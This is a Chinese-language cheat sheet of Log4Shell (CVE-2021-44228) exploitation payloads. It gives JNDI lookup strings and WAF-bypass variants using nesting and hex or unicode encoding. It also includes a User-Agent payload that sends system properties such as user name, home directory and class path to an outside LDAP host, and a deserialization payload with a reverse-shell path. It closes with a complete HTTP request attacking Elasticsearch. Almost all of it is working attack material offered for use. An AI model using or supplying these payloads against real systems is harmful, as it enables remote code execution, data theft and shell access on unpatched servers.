# 记录Log4jshell利用的工具和payload等
## poc

```
原始payload：${jndi:ldap|rmi://127.0.0.1:1389/ass}
关键函数绕过:  ${${lower:jn}${lower:d}i:${lower:rmi}://127.0.0.1:1389/poc}
横杆绕过：     ${::-j}${::-n}${::-d}${::-i}:rmi://127.0.0.1:1389/ass}
空格绕过：      ${j${::-}n${::-}d${::-}i:rmi://127.0.0.1:1389/ass}
任意字符任意长度：${j${amjy:rX:-n}${hh:NLwGqf:-d}${::-i}:ldap://127.0.0.1:1389/ass}
${j${sdf:……%¥df:asdf:rX:-n}${hh:NLwGqf:-d}${::-i}:ldap://127.0.0.1:1389/ass}
多层嵌套(可导致ddos)：${${${${${${::j}}}}}${${${${${::n}${::di}}}}}:ldap|rmi://127.0.0.1:1389/ass}
16进制编码绕过：
\x24{\x6a\x6e\x64\x69:\x6c\x64\x61\x70://1.1.1.1:1389/xx}
// jndi -> \x6a\x6e\x64\x69
// ldap -> \x6c\x64\x61\x70
// rmi -> \x72\x6d\x69       
unicode编码绕过：
\ud83d\ude04${jndi:ldap://1.1.1.1:1389}

JAVA运行参数
User-Agent: ${jndi:ldap://1.1.1.1:987/${sys:user.name}/${sys:java.vendor}/x/${sys:user.home}/x/${sys:user.dir}/${sys:os.version}/${sys:java.class.path}}

环境变量FUZZ：
${jndi:ldap://u${hostName}-s2u-${env:USERNAME:-${env:USER}}.x.x.x:99999/1}
参考：
Linux环境变量：env, Windows环境变量：windows set
https://github.com/jas502n/Log4j2-CVE-2021-44228


```
## 注意
- 可以尝试CommonsCollectionsK1链

```
\u0024{jndi:\u006cdap://x.x.x.x:port/Deserialization/CommonsCollectionsK1/ReverseShell/4.2.1.5/12345}
```
- 目标可以使用ldap，rmi 发出dnslog,但是不能连接成功【可能是端口问题，FUZZ找到可出来的端口】
## ES POC

```
PUT /_template/%24%7Bjndi%3Aldap%3A%2F%2F%24%7Bsys%3Ajava.version%7D.%24%7BhostName%7D.EXP.Log4jViaAccept.xxxx.xxxx.cn%2Fass%7D HTTP/1.1
Host: 1.2.24:9200
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Length: 36

{
"index_patterns":["te*","bar"]
}
```
